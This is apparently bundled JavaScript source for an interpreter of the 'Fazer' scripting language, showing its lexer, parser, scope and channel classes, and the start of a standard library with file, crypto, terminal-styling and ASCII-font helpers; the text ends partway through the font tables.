var Comment = createToken({ name: "Comment", pattern: /(#|\/\/)[^\n]*/, group: Lexer.SKIPPED });
var Assign = createToken({ name: "Assign", pattern: /:=/ });
var SingleEq = createToken({ name: "SingleEq", pattern: /=/ });
var Arrow = createToken({ name: "Arrow", pattern: /->|→/ });
var DoublePipe = createToken({ name: "DoublePipe", pattern: /->>|\|>|→>/ });
var Case = createToken({ name: "Case", pattern: /case\b/ });
var If = createToken({ name: "If", pattern: /if\b/ });
var Else = createToken({ name: "Else", pattern: /else\b/ });
var End = createToken({ name: "End", pattern: /end\b/ });
var Fn = createToken({ name: "Fn", pattern: /fn\b/ });
var Return = createToken({ name: "Return", pattern: /return\b/ });
var While = createToken({ name: "While", pattern: /while\b/ });
var Try = createToken({ name: "Try", pattern: /try\b/ });
var Catch = createToken({ name: "Catch", pattern: /catch\b/ });
var Mut = createToken({ name: "Mut", pattern: /mut\b/ });
var Await = createToken({ name: "Await", pattern: /await\b/ });
var True = createToken({ name: "True", pattern: /true\b/ });
var False = createToken({ name: "False", pattern: /false\b/ });
var Null = createToken({ name: "Null", pattern: /null\b/ });
var And = createToken({ name: "And", pattern: /and\b/ });
var Or = createToken({ name: "Or", pattern: /or\b/ });
var Not = createToken({ name: "Not", pattern: /not\b/ });
var GreaterEq = createToken({ name: "GreaterEq", pattern: />=/ });
var LessEq = createToken({ name: "LessEq", pattern: /<=/ });
var Eq = createToken({ name: "Eq", pattern: /==/ });
var NotEq = createToken({ name: "NotEq", pattern: /!=/ });
var Greater = createToken({ name: "Greater", pattern: />/ });
var Less = createToken({ name: "Less", pattern: /</ });
var Exclamation = createToken({ name: "Exclamation", pattern: /!/ });
var LParen = createToken({ name: "LParen", pattern: /\(/ });
var RParen = createToken({ name: "RParen", pattern: /\)/ });
var LBracket = createToken({ name: "LBracket", pattern: /\[/ });
var RBracket = createToken({ name: "RBracket", pattern: /\]/ });
var LBrace = createToken({ name: "LBrace", pattern: /{/ });
var RBrace = createToken({ name: "RBrace", pattern: /}/ });
var Colon = createToken({ name: "Colon", pattern: /:/ });
var Comma = createToken({ name: "Comma", pattern: /,/ });
var Dot = createToken({ name: "Dot", pattern: /\./ });
var Plus = createToken({ name: "Plus", pattern: /\+/ });
var Minus = createToken({ name: "Minus", pattern: /-/ });
var Star = createToken({ name: "Star", pattern: /\*/ });
var Slash = createToken({ name: "Slash", pattern: /\// });
var Percent = createToken({ name: "Percent", pattern: /%/ });
var Float = createToken({ name: "Float", pattern: /-?\d+\.\d+/ });
var Integer = createToken({ name: "Integer", pattern: /-?\d+/ });
var StringLiteral = createToken({
  name: "StringLiteral",
  pattern: /"([^"\\]|\\.)*"/
});
var Identifier = createToken({
  name: "Identifier",
  pattern: /[a-zA-Z_][a-zA-Z0-9_]*/
});
var allTokens = [
  WhiteSpace,
  Comment,
  Assign,
  DoublePipe,
  Arrow,
  Case,
  If,
  Else,
  End,
  Fn,
  Return,
  While,
  Try,
  Catch,
  Mut,
  Await,
  True,
  False,
  Null,
  And,
  Or,
  Not,
  GreaterEq,
  LessEq,
  Eq,
  NotEq,
  Greater,
  Less,
  Exclamation,
  SingleEq,
  LParen,
  RParen,
  LBracket,
  RBracket,
  LBrace,
  RBrace,
  Colon,
  Comma,
  Dot,
  Plus,
  Minus,
  Star,
  Slash,
  Percent,
  Float,
  Integer,
  StringLiteral,
  Identifier
];
var lexer = new Lexer(allTokens, { positionTracking: "full" });
var FazerParser = class extends EmbeddedActionsParser {
  constructor() {
    super(allTokens, { recoveryEnabled: true });
    const $ = this;
    const node = (type, props) => ({ type, ...props });
    $.RULE("program", () => {
      const stmts = [];
      $.MANY(() => {
        const s = $.SUBRULE($.statement);
        if (s) stmts.push(s);
      });
      return stmts;
    });
    $.RULE(
      "statement",
      () => $.OR([
        { ALT: () => $.SUBRULE($.fnDef) },
        { ALT: () => $.SUBRULE($.returnStmt) },
        { ALT: () => $.SUBRULE($.ifStmt) },
        { ALT: () => $.SUBRULE($.whileStmt) },
        { ALT: () => $.SUBRULE($.tryStmt) },
        {
          GATE: () => {
            const t1 = $.LA(1).tokenType;
            if (t1 === Mut) return true;
            const t2 = $.LA(2).tokenType;
            return t1 === Identifier && (t2 === Assign || t2 === SingleEq);
          },
          ALT: () => $.SUBRULE($.assignStmt)
        },
        { ALT: () => $.SUBRULE($.caseBlock) },
        { ALT: () => $.SUBRULE($.exprStmt) }
      ])
    );
    $.RULE("fnDef", () => {
      $.CONSUME(Fn);
      const nameTok = $.CONSUME(Identifier);
      $.CONSUME(LParen);
      const params = [];
      $.OPTION(() => {
        params.push($.CONSUME2(Identifier).image);
        $.MANY(() => {
          $.CONSUME(Comma);
          params.push($.CONSUME3(Identifier).image);
        });
      });
      $.CONSUME(RParen);
      $.CONSUME(Arrow);
      const body = $.SUBRULE($.block);
      return node("fn", { name: nameTok.image, params, body, loc: locOf(nameTok) });
    });
    $.RULE("returnStmt", () => {
      const tok = $.CONSUME(Return);
      const value = $.OPTION(() => $.SUBRULE($.expression));
      return node("return", { value: value ?? node("null", {}), loc: locOf(tok) });
    });
    $.RULE("ifStmt", () => {
      const tok = $.CONSUME(If);
      const expr = $.SUBRULE($.expression);
      $.CONSUME(Arrow);
      const thenBlock = $.SUBRULE($.body);
      let elseBlock = null;
      $.OR([
        { ALT: () => $.CONSUME(End) },
        {
          ALT: () => {
            $.CONSUME(Else);
            $.OR2([
              {
                ALT: () => {
                  const nested = $.SUBRULE($.ifStmt);
                  elseBlock = [nested];
                }
              },
              {
                ALT: () => {
                  $.CONSUME2(Arrow);
                  elseBlock = $.SUBRULE2($.body);
                  $.CONSUME2(End);
                }
              }
            ]);
          }
        }
      ]);
      return node("if", { expr, thenBlock, elseBlock, loc: locOf(tok) });
    });
    $.RULE("whileStmt", () => {
      const tok = $.CONSUME(While);
      const expr = $.SUBRULE($.expression);
      $.CONSUME(Arrow);
      const body = $.SUBRULE($.block);
      return node("while", { expr, body, loc: locOf(tok) });
    });
    $.RULE("tryStmt", () => {
      const tok = $.CONSUME(Try);
      $.CONSUME(Arrow);
      const tryBlock = $.SUBRULE($.block);
      $.CONSUME(Catch);
      const errVar = $.CONSUME(Identifier).image;
      $.CONSUME2(Arrow);
      const catchBlock = $.SUBRULE2($.block);
      return node("try", { tryBlock, catchBlock, errVar, loc: locOf(tok) });
    });
    $.RULE("assignStmt", () => {
      const mutTok = $.OPTION(() => $.CONSUME(Mut));
      const idTok = $.CONSUME(Identifier);
      const op = $.OR([
        { ALT: () => $.CONSUME(Assign) },
        { ALT: () => $.CONSUME(SingleEq) }
      ]);
      const value = $.SUBRULE($.expression);
      return node("assign", {
        name: idTok.image,
        mut: !!mutTok,
        value,
        loc: locOf(idTok)
      });
    });
    $.RULE("caseBlock", () => {
      const caseTok = $.CONSUME(Case);
      const expr = $.SUBRULE($.addExpr);
      const arms = [];
      $.AT_LEAST_ONE(() => {
        const pat = $.OR([
          { ALT: () => $.SUBRULE($.pattern) },
          { ALT: () => ($.CONSUME(Else), node("else", {})) }
        ]);
        $.CONSUME(Arrow);
        const body = $.SUBRULE($.block);
        arms.push({ pat, body });
      });
      $.CONSUME(End);
      return node("case", { expr, arms, loc: locOf(caseTok) });
    });
    $.RULE("body", () => {
      const stmts = [];
      $.MANY(() => {
        const s = $.SUBRULE($.statement);
        if (s) stmts.push(s);
      });
      return stmts;
    });
    $.RULE("block", () => {
      const stmts = $.SUBRULE($.body);
      $.CONSUME(End);
      return stmts;
    });
    $.RULE("exprStmt", () => {
      const expr = $.SUBRULE($.expression);
      if (!expr) return node("noop", {});
      return node("exprstmt", { expr, loc: expr.loc ?? null });
    });
    $.RULE(
      "pattern",
      () => $.OR([
        { ALT: () => $.SUBRULE($.patternCompare) },
        { ALT: () => $.SUBRULE($.literal) },
        { ALT: () => node("identPat", { name: $.CONSUME(Identifier).image }) }
        // binds
      ])
    );
    $.RULE("patternCompare", () => {
      const opTok = $.OR([
        { ALT: () => $.CONSUME(GreaterEq) },
        { ALT: () => $.CONSUME(LessEq) },
        { ALT: () => $.CONSUME(Greater) },
        { ALT: () => $.CONSUME(Less) },
        { ALT: () => $.CONSUME(Eq) },
        { ALT: () => $.CONSUME(NotEq) },
        { ALT: () => $.CONSUME(SingleEq) }
      ]);
      if (opTok.tokenType && opTok.tokenType.name === "SingleEq") {
        throw new FazerError("Invalid operator '=' in pattern. Use '==' or just the value.", { line: opTok.startLine, col: opTok.startColumn });
      }
      const rhs = $.SUBRULE($.expression);
      return node("cmpPat", { op: opTok.image, rhs });
    });
    $.RULE("expression", () => $.SUBRULE($.pipeExpr));
    $.RULE("pipeExpr", () => {
      let left = $.SUBRULE($.orExpr);
      $.MANY(() => {
        $.CONSUME(DoublePipe);
        const right = $.SUBRULE2($.orExpr);
        left = node("pipe", { left, right, loc: left.loc ?? null });
      });
      return left;
    });
    $.RULE("orExpr", () => {
      let left = $.SUBRULE($.andExpr);
      $.MANY(() => {
        $.CONSUME(Or);
        const right = $.SUBRULE2($.andExpr);
        left = node("bin", { op: "or", left, right, loc: left.loc ?? null });
      });
      return left;
    });
    $.RULE("andExpr", () => {
      let left = $.SUBRULE($.eqExpr);
      $.MANY(() => {
        $.CONSUME(And);
        const right = $.SUBRULE2($.eqExpr);
        left = node("bin", { op: "and", left, right, loc: left.loc ?? null });
      });
      return left;
    });
    $.RULE("eqExpr", () => {
      let left = $.SUBRULE($.relExpr);
      $.MANY(() => {
        const opTok = $.OR([
          { ALT: () => $.CONSUME(Eq) },
          { ALT: () => $.CONSUME(NotEq) },
          { ALT: () => $.CONSUME(SingleEq) }
        ]);
        if (opTok.tokenType && opTok.tokenType.name === "SingleEq") {
          throw new FazerError("Invalid operator '='. Use '==' for equality.", { line: opTok.startLine, col: opTok.startColumn });
        }
        const right = $.SUBRULE2($.relExpr);
        left = node("bin", { op: opTok.image, left, right, loc: left.loc ?? null });
      });
      return left;
    });
    $.RULE("relExpr", () => {
      let left = $.SUBRULE($.addExpr);
      $.MANY(() => {
        const op = $.OR([
          { ALT: () => $.CONSUME(GreaterEq).image },
          { ALT: () => $.CONSUME(LessEq).image },
          { ALT: () => $.CONSUME(Greater).image },
          { ALT: () => $.CONSUME(Less).image }
        ]);
        const right = $.SUBRULE2($.addExpr);
        left = node("bin", { op, left, right, loc: left.loc ?? null });
      });
      return left;
    });
    $.RULE("addExpr", () => {
      let left = $.SUBRULE($.mulExpr);
      $.MANY(() => {
        const op = $.OR([
          { ALT: () => $.CONSUME(Plus).image },
          { ALT: () => $.CONSUME(Minus).image }
        ]);
        const right = $.SUBRULE2($.mulExpr);
        left = node("bin", { op, left, right, loc: left.loc ?? null });
      });
      return left;
    });
    $.RULE("mulExpr", () => {
      let left = $.SUBRULE($.unaryExpr);
      $.MANY(() => {
        const op = $.OR([
          { ALT: () => $.CONSUME(Star).image },
          { ALT: () => $.CONSUME(Slash).image },
          { ALT: () => $.CONSUME(Percent).image }
        ]);
        const right = $.SUBRULE2($.unaryExpr);
        left = node("bin", { op, left, right, loc: left.loc ?? null });
      });
      return left;
    });
    $.RULE(
      "unaryExpr",
      () => $.OR([
        {
          ALT: () => {
            const tok = $.CONSUME(Await);
            const expr = $.SUBRULE3($.unaryExpr);
            return node("await", { expr, loc: locOf(tok) });
          }
        },
        {
          ALT: () => {
            const tok = $.OR2([
              { ALT: () => $.CONSUME(Not) },
              { ALT: () => $.CONSUME(Exclamation) }
            ]);
            const expr = $.SUBRULE($.unaryExpr);
            return node("un", { op: "not", expr, loc: locOf(tok) });
          }
        },
        {
          ALT: () => {
            const tok = $.CONSUME(Minus);
            const expr = $.SUBRULE2($.unaryExpr);
            return node("un", { op: "-", expr, loc: locOf(tok) });
          }
        },
        { ALT: () => $.SUBRULE($.postfixExpr) }
      ])
    );
    $.RULE("postfixExpr", () => {
      let base = $.SUBRULE($.primaryExpr);
      $.MANY(() => {
        $.OR([
          {
            ALT: () => {
              $.CONSUME(LParen);
              const args2 = [];
              $.OPTION(() => {
                args2.push($.SUBRULE($.expression));
                $.MANY2(() => {
                  $.CONSUME(Comma);
                  args2.push($.SUBRULE2($.expression));
                });
              });
              $.CONSUME(RParen);
              base = node("call", { callee: base, args: args2, loc: base.loc ?? null });
            }
          },
          {
            ALT: () => {
              $.CONSUME(Dot);
              const keyTok = $.CONSUME(Identifier);
              base = node("get", { obj: base, key: node("str", { value: keyTok.image }), loc: base.loc ?? null });
            }
          },
          {
            ALT: () => {
              $.CONSUME(LBracket);
              const idx = $.SUBRULE3($.expression);
              $.CONSUME(RBracket);
              base = node("idx", { obj: base, idx, loc: base.loc ?? null });
            }
          }
        ]);
      });
      return base;
    });
    $.RULE(
      "primaryExpr",
      () => $.OR([
        { ALT: () => $.SUBRULE($.literal) },
        {
          ALT: () => {
            const tok = $.CONSUME(Identifier);
            return node("ident", { name: tok.image, loc: locOf(tok) });
          }
        },
        {
          ALT: () => {
            $.CONSUME(LParen);
            const e = $.SUBRULE($.expression);
            $.CONSUME(RParen);
            return e;
          }
        },
        { ALT: () => $.SUBRULE($.listLiteral) },
        { ALT: () => $.SUBRULE($.mapLiteral) },
        { ALT: () => $.SUBRULE($.fnExpr) }
      ])
    );
    $.RULE("fnExpr", () => {
      const tok = $.CONSUME(Fn);
      $.CONSUME(LParen);
      const params = [];
      $.OPTION(() => {
        params.push($.CONSUME(Identifier).image);
        $.MANY(() => {
          $.CONSUME(Comma);
          params.push($.CONSUME2(Identifier).image);
        });
      });
      $.CONSUME(RParen);
      $.CONSUME(Arrow);
      const body = $.SUBRULE($.block);
      return node("fn", { name: null, params, body, loc: locOf(tok) });
    });
    $.RULE(
      "literal",
      () => $.OR([
        {
          ALT: () => {
            const tok = $.CONSUME(Float);
            return node("num", { value: Number(tok.image), loc: locOf(tok) });
          }
        },
        {
          ALT: () => {
            const tok = $.CONSUME(Integer);
            return node("num", { value: Number(tok.image), loc: locOf(tok) });
          }
        },
        {
          ALT: () => {
            const tok = $.CONSUME(StringLiteral);
            return node("str", { value: unescapeString(tok.image), loc: locOf(tok) });
          }
        },
        {
          ALT: () => {
            const tok = $.CONSUME(True);
            return node("bool", { value: true, loc: locOf(tok) });
          }
        },
        {
          ALT: () => {
            const tok = $.CONSUME(False);
            return node("bool", { value: false, loc: locOf(tok) });
          }
        },
        {
          ALT: () => {
            const tok = $.CONSUME(Null);
            return node("null", { loc: locOf(tok) });
          }
        }
      ])
    );
    $.RULE("listLiteral", () => {
      const tok = $.CONSUME(LBracket);
      const items = [];
      $.OPTION(() => {
        items.push($.SUBRULE($.expression));
        $.MANY(() => {
          $.CONSUME(Comma);
          items.push($.SUBRULE2($.expression));
        });
      });
      $.CONSUME(RBracket);
      return node("list", { items, loc: locOf(tok) });
    });
    $.RULE("mapLiteral", () => {
      const tok = $.CONSUME(LBrace);
      const entries = [];
      $.OPTION(() => {
        entries.push($.SUBRULE($.mapEntry));
        $.MANY(() => {
          $.CONSUME(Comma);
          entries.push($.SUBRULE2($.mapEntry));
        });
      });
      $.CONSUME(RBrace);
      return node("map", { entries, loc: locOf(tok) });
    });
    $.RULE("mapEntry", () => {
      const key = $.OR([
        {
          ALT: () => {
            const t = $.CONSUME(StringLiteral);
            return node("str", { value: unescapeString(t.image), loc: locOf(t) });
          }
        },
        {
          ALT: () => {
            const t = $.CONSUME(Identifier);
            return node("str", { value: t.image, loc: locOf(t) });
          }
        }
      ]);
      $.CONSUME(Colon);
      const value = $.SUBRULE($.expression);
      return { key, value };
    });
    this.performSelfAnalysis();
  }
};
var FazerError = class extends Error {
  constructor(message, meta = {}) {
    super(message);
    this.name = "FazerError";
    this.meta = meta;
  }
};
var ReturnSignal = class {
  constructor(value) {
    this.value = value;
  }
};
var Scope = class {
  constructor(parent = null) {
    this.parent = parent;
    this.vars = /* @__PURE__ */ new Map();
  }
  hasHere(name) {
    return this.vars.has(name);
  }
  get(name) {
    if (this.vars.has(name)) return this.vars.get(name);
    if (this.parent) return this.parent.get(name);
    return null;
  }
  set(name, value, mut = false) {
    this.vars.set(name, { value, mut });
  }
  assign(name, value) {
    if (this.vars.has(name)) {
      const cell = this.vars.get(name);
      if (!cell.mut) throw new FazerError(`Variable '${name}' is immutable (use mut)`);
      cell.value = value;
      return;
    }
    if (this.parent) return this.parent.assign(name, value);
    throw new FazerError(`Undefined variable '${name}'`);
  }
};
var Channel = class {
  constructor(capacity = 0) {
    this.capacity = Number(capacity) || 0;
    this.buffer = [];
    this.senders = [];
    this.receivers = [];
    this.closed = false;
  }
  send(value) {
    if (this.closed) return Promise.reject(new Error("Send on closed channel"));
    return new Promise((resolve, reject2) => {
      if (this.receivers.length > 0) {
        const receiver = this.receivers.shift();
        receiver.resolve(value);
        resolve();
        return;
      }
      if (this.buffer.length < this.capacity) {
        this.buffer.push(value);
        resolve();
        return;
      }
      this.senders.push({ value, resolve, reject: reject2 });
    });
  }
  recv() {
    if (this.closed && this.buffer.length === 0) return Promise.resolve(null);
    return new Promise((resolve, reject2) => {
      if (this.buffer.length > 0) {
        const val = this.buffer.shift();
        if (this.senders.length > 0) {
          const sender = this.senders.shift();
          this.buffer.push(sender.value);
          sender.resolve();
        }
        resolve(val);
        return;
      }
      if (this.senders.length > 0) {
        const sender = this.senders.shift();
        resolve(sender.value);
        sender.resolve();
        return;
      }
      if (this.closed) {
        resolve(null);
        return;
      }
      this.receivers.push({ resolve, reject: reject2 });
    });
  }
  close() {
    if (this.closed) return;
    this.closed = true;
    while (this.receivers.length > 0) this.receivers.shift().resolve(null);
    while (this.senders.length > 0) this.senders.shift().reject(new Error("Channel closed"));
  }
};
var FazerRuntime = class _FazerRuntime {
  constructor({ argv: argv2 = process.argv.slice(2), filename = "<stdin>", code: code2 = "", permissions: permissions2 = null } = {}) {
    this.filename = filename;
    this.code = code2;
    this.global = new Scope(null);
    this.fns = /* @__PURE__ */ new Map();
    this.native_ui_state = { widgets: [], updates: {} };
    this.profiling = false;
    this.profileData = /* @__PURE__ */ new Map();
    this.traceMode = false;
    this.permissions = permissions2 || /* @__PURE__ */ new Set(["fs", "net", "exec", "osint"]);
    this._installStdlib(argv2);
  }
  _installStdlib(argv2) {
    const checkPerm = (perm) => {
      if (this.permissions && !this.permissions.has(perm)) throw new Error(`Permission denied: '${perm}' is required.`);
    };
    const { execFileSync } = require("child_process");
    let WebSocket = null;
    try {
      WebSocket = require_ws();
    } catch (e) {
    }
    const ANSI = {
      reset: "\x1B[0m",
      bold: "\x1B[1m",
      dim: "\x1B[2m",
      red: "\x1B[31m",
      green: "\x1B[32m",
      yellow: "\x1B[33m",
      blue: "\x1B[34m",
      magenta: "\x1B[35m",
      cyan: "\x1B[36m",
      gray: "\x1B[90m"
    };
    const style = (s, c) => (ANSI[c] || "") + String(s) + ANSI.reset;
    const stripAnsi = (s) => String(s).replace(/\x1b\[[0-9;]*m/g, "");
    const box = (title, lines) => {
      const arr = Array.isArray(lines) ? lines.map(String) : [String(lines)];
      const all = [String(title), ...arr];
      const visibleLen = (s) => stripAnsi(s).length;
      const w = Math.max(...all.map(visibleLen)) + 4;
      const top = "\u250C" + "\u2500".repeat(w - 2) + "\u2510";
      const bot = "\u2514" + "\u2500".repeat(w - 2) + "\u2518";
      const mid = all.map((l) => {
        const vl = visibleLen(l);
        const pad = w - 4 - vl;
        return "\u2502 " + l + " ".repeat(Math.max(0, pad)) + " \u2502";
      });
      console.log(top);
      for (const m of mid) console.log(m);
      console.log(bot);
      return null;
    };
    const toBuf = (x, enc = "utf8") => {
      if (Buffer.isBuffer(x)) return x;
      if (typeof x === "string") return Buffer.from(x, enc);
      return Buffer.from(String(x), enc);
    };
    const readText = (p) => fs.readFileSync(path.resolve(String(p)), "utf8");
    const writeText = (p, s) => {
      fs.writeFileSync(path.resolve(String(p)), String(s), "utf8");
      return null;
    };
    const readBytesB64 = (p) => fs.readFileSync(path.resolve(String(p))).toString("base64");
    const writeBytesB64 = (p, b642) => {
      fs.writeFileSync(path.resolve(String(p)), Buffer.from(String(b642), "base64"));
      return null;
    };
    const hex = (buf) => Buffer.from(buf).toString("hex");
    const b64 = (buf) => Buffer.from(buf).toString("base64");
    const fromHex = (h) => Buffer.from(String(h), "hex");
    const fromB64 = (b) => Buffer.from(String(b), "base64");
    const sha256 = (x) => hex(crypto.createHash("sha256").update(toBuf(x)).digest());
    const encText = (plaintext, password) => {
      const salt = crypto.randomBytes(16);
      const key = crypto.scryptSync(String(password), salt, 32);
      const iv = crypto.randomBytes(12);
      const cipher = crypto.createCipheriv("aes-256-gcm", key, iv);
      const ct = Buffer.concat([cipher.update(String(plaintext), "utf8"), cipher.final()]);
      const tag = cipher.getAuthTag();
      return b64(Buffer.concat([salt, iv, tag, ct]));
    };
    const decText = (payloadB64, password) => {
      const payload = fromB64(payloadB64);
      if (payload.length < 16 + 12 + 16) throw new FazerError("Invalid encrypted payload");
      const salt = payload.subarray(0, 16);
      const iv = payload.subarray(16, 28);
      const tag = payload.subarray(28, 44);
      const ct = payload.subarray(44);
      const key = crypto.scryptSync(String(password), salt, 32);
      const decipher = crypto.createDecipheriv("aes-256-gcm", key, iv);
      decipher.setAuthTag(tag);
      const pt = Buffer.concat([decipher.update(ct), decipher.final()]);
      return pt.toString("utf8");
    };
    const encB64 = (b64data, password) => encText(String(b64data), password);
    const decB64 = (payloadB64, password) => decText(payloadB64, password);
    const pathJoin = (...xs) => path.join(...xs.map(String));
    const pathAbs = (p) => path.resolve(String(p));
    const pathDir = (p) => path.dirname(String(p));
    const pathBase = (p) => path.basename(String(p));
    const nowMs = () => Date.now();
    const len = (x) => x == null ? 0 : typeof x === "string" || Array.isArray(x) ? x.length : typeof x === "object" ? Object.keys(x).length : 0;
    const keys2 = (o) => {
      if (o == null || typeof o !== "object") return [];
      return Object.keys(o);
    };
    const get2 = (o, k) => {
      if (o == null) return null;
      if (Array.isArray(o)) return o[Number(k)];
      return o[String(k)];
    };
    const set = (o, k, v) => {
      if (o == null || typeof o !== "object") throw new FazerError("set(obj,key,val) expects object/list");
      if (Array.isArray(o)) {
        o[Number(k)] = v;
        return o;
      }
      o[String(k)] = v;
      return o;
    };
    const argvFn = () => argv2.slice();
    const envFn = (k) => process.env[String(k)] ?? null;
    const cwdFn = () => process.cwd();
    const http2 = require("http");
    const https2 = require("https");
    const child_process2 = require("child_process");
    const makeGradient = (text, startColor, endColor) => {
      const len2 = text.length;
      if (len2 === 0) return "";
      const [r1, g1, b1] = startColor;
      const [r2, g2, b2] = endColor;
      let res = "";
      for (let i = 0; i < len2; i++) {
        const ratio = i / (len2 - 1 || 1);
        const r = Math.round(r1 + (r2 - r1) * ratio);
        const g = Math.round(g1 + (g2 - g1) * ratio);
        const b = Math.round(b1 + (b2 - b1) * ratio);
        res += `\x1B[38;2;${r};${g};${b}m${text[i]}`;
      }
      return res + "\x1B[0m";
    };
    let stdinBuffer = [];
    let stdinListener = null;
    const enableRawInput = (enable) => {
      try {
        if (process.stdin.isTTY) {
          process.stdin.setRawMode(!!enable);
        }
      } catch (e) {
      }
      if (enable) {
        process.stdin.resume();
        if (!stdinListener) {
          stdinListener = (chunk) => {
            const str = chunk.toString();
            for (const char of str) stdinBuffer.push(char);
          };
          process.stdin.on("data", stdinListener);
        }
      } else {
        try {
          if (process.stdin.isTTY) process.stdin.setRawMode(false);
        } catch (e) {
        }
        if (stdinListener) {
          process.stdin.removeListener("data", stdinListener);
          stdinListener = null;
        }
        process.stdin.pause();
      }
    };
    const ASCII_FONTS = {
      "standard": {
        "0": [
          " 000 ",
          "0  00",
          "0 0 0",
          "00  0",
          " 000 "
        ],
        "1": [
          "  1  ",
          " 11  ",
          "  1  ",
          "  1  ",
          " 111 "
        ],
        "2": [
          " 222 ",
          "2   2",
          "   2 ",
          "  2  ",
          "22222"
        ],
        "3": [
          "3333 ",
          "    3",
          "  33 ",
          "    3",
          "3333 "
        ],
        "4": [
          "4  4 ",
          "4  4 ",
          "44444",
          "   4 ",
          "   4 "
        ],
        "5": [
          "55555",
          "5    ",
          "5555 ",
          "    5",
          "5555 "
        ],
        "6": [
          " 666 ",
          "6    ",
          "6666 ",
          "6   6",
          " 666 "
        ],
        "7": [
          "77777",
          "   7 ",
          "  7  ",
          " 7   ",
          "7    "
        ],
        "8": [
          " 888 ",
          "8   8",
          " 888 ",
          "8   8",
          " 888 "
        ],
        "9": [
          " 999 ",
          "9   9",
          " 9999",
          "    9",
          " 999 "
        ],
        " ": [
          "     ",
          "     ",
          "     ",
          "     ",
          "     "
        ],
        "A": [
          "  A  ",
          " A A ",
          "AAAAA",
          "A   A",
          "A   A"
        ],
        "B": [
          "BBBB ",
          "B   B",
          "BBBB ",
          "B   B",
          "BBBB "
        ],
        "C": [
          " CCCC",
          "C    ",
          "C    ",
          "C    ",
          " CCCC"
        ],
        "D": [
          "DDDD ",
          "D   D",
          "D   D",
          "D   D",
          "DDDD "
        ],
        "E": [
          "EEEEE",
          "E    ",
          "EEE  ",
          "E    ",
          "EEEEE"
        ],
        "F": [
          "FFFFF",
          "F    ",
          "FFF  ",
          "F    ",
          "F    "
        ],
        "G": [
          " GGGG",
          "G    ",
          "G  GG",
          "G   G",
          " GGGG"
        ],
        "H": [
          "H   H",
          "H   H",
          "HHHHH",
          "H   H",
          "H   H"
        ],
        "I": [
          "IIIII",
          "  I  ",
          "  I  ",
          "  I  ",
          "IIIII"
        ],
        "J": [
          "JJJJJ",
          "  J  ",
          "  J  ",
          "J J  ",
          " JJ  "
        ],
        "K": [
          "K   K",
          "K  K ",
          "KKK  ",
          "K  K ",
          "K   K"
        ],
        "L": [
          "L    ",
          "L    ",
          "L    ",
          "L    ",
          "LLLLL"
        ],
        "M": [
          "M   M",
          "MM MM",
          "M M M",
          "M   M",
          "M   M"
        ],
        "N": [
          "N   N",
          "NN  N",
          "N N N",
          "N  NN",
          "N   N"
        ],
        "O": [
          " OOO ",
          "O   O",
          "O   O",
          "O   O",
          " OOO "
        ],
        "P": [
          "PPPP ",
          "P   P",
          "PPPP ",
          "P    ",
          "P    "
        ],
        "Q": [
          " QQQ ",
          "Q   Q",
          "Q   Q",
          "Q  QQ",
          " QQQQ"
        ],
        "R": [
          "RRRR ",
          "R   R",
          "RRRR ",
          "R  R ",
          "R   R"
        ],
        "S": [
          " SSSS",
          "S    ",
          " SSS ",
          "    S",
          "SSSS "
        ],
        "T": [
          "TTTTT",
          "  T  ",
          "  T  ",
          "  T  ",
          "  T  "
        ],
        "U": [
          "U   U",
          "U   U",
          "U   U",
          "U   U",
          " UUU "
        ],
        "V": [
          "V   V",
          "V   V",
          "V   V",
          " V V ",
          "  V  "
        ],
        "W": [
          "W   W",
          "W   W",
          "W W W",
          "W W W",
          " W W "
        ],
        "X": [
          "X   X",
          " X X ",
          "  X  ",
          " X X ",
          "X   X"
        ],
        "Y": [
          "Y   Y",
          " Y Y ",
          "  Y  ",
          "  Y  ",
          "  Y  "
        ],
        "Z": [
          "ZZZZZ",
          "   Z ",
          "  Z  ",
          " Z   ",
          "ZZZZZ"
        ]
      },
      "block": {
        "0": [
          "\u2588\u2580\u2588",
          "\u2588 \u2588",
          "\u2580\u2580\u2580"
        ],
        "1": [
          "\u2584\u2588 ",
          " \u2588 ",
          "\u2584\u2588\u2584"
        ],
        "2": [
          "\u2580\u2580\u2588",
          " \u2588 ",
          "\u2588\u2580\u2580"
        ],
        "3": [
          "\u2580\u2580\u2588",
          " \u2580\u2588",
          "\u2580\u2580\u2580"
        ],
        "4": [
          "\u2588 \u2588",
          "\u2588\u2580\u2588",
          "  \u2588"
        ],
        "5": [
          "\u2588\u2580\u2580",
          "\u2580\u2580\u2584",
          "\u2580\u2580\u2580"
        ],
        "6": [
          "\u2588\u2580 ",
          "\u2588\u2580\u2588",
          "\u2580\u2580\u2580"
        ],
        "7": [
          "\u2580\u2580\u2588",
          "  \u2588",
          "  \u2580"
        ],
        "8": [
          "\u2588\u2580\u2588",
          "\u2588\u2580\u2588",
          "\u2580\u2580\u2580"
        ],
        "9": [
          "\u2588\u2580\u2588",
          "\u2580\u2580\u2588",
          "  \u2580"
        ],
        " ": [
          "   ",
          "   ",
          "   "
        ],
        "A": [
          "\u2584\u2580\u2584",
          "\u2588\u2580\u2588",
          "\u2580 \u2580"
        ],
        "B": [
          "\u2588\u2580\u2584",
          "\u2588\u2580\u2584",
          "\u2580\u2580 "
        ],
        "C": [
          "\u2584\u2580\u2580",
          "\u2588  ",
          "\u2580\u2580\u2580"
        ],
        "D": [
          "\u2588\u2580\u2584",
          "\u2588 \u2588",
          "\u2580\u2580 "
        ],
        "E": [
          "\u2588\u2580\u2580",
          "\u2588\u2580\u2580",
          "\u2580\u2580\u2580"
        ],
        "F": [
          "\u2588\u2580\u2580",
          "\u2588\u2580\u2580",
          "\u2580  "
        ],
        "G": [
          "\u2588\u2580\u2580",
          "\u2588 \u2588",
          "\u2580\u2580\u2580"
        ],
        "H": [
          "\u2588 \u2588",
          "\u2588\u2580\u2588",
          "\u2580 \u2580"
        ],
        "I": [
          "\u2580\u2588\u2580",
          " \u2588 ",
          "\u2580\u2588\u2580"
        ],
        "J": [
          " \u2584\u2584",
          " \u2588 ",
          "\u2580  "
        ],
        "K": [
          "\u2588 \u2584",
          "\u2588\u2580\u2584",
          "\u2580 \u2580"
        ],
        "L": [
          "\u2588  ",
          "\u2588  ",
          "\u2580\u2580\u2580"
        ],
        "M": [
          "\u2588\u2580\u2588",
          "\u2588 \u2588",
          "\u2580 \u2580"
        ],
        "N": [
          "\u2588\u2580\u2584",
          "\u2588 \u2588",
          "\u2580 \u2580"
        ],
        "O": [
          "\u2584\u2580\u2584",
          "\u2588 \u2588",
          "\u2580\u2580\u2580"
        ],
        "P": [
          "\u2588\u2580\u2584",
          "\u2588\u2580\u2580",
          "\u2580  "
        ],
        "Q": [
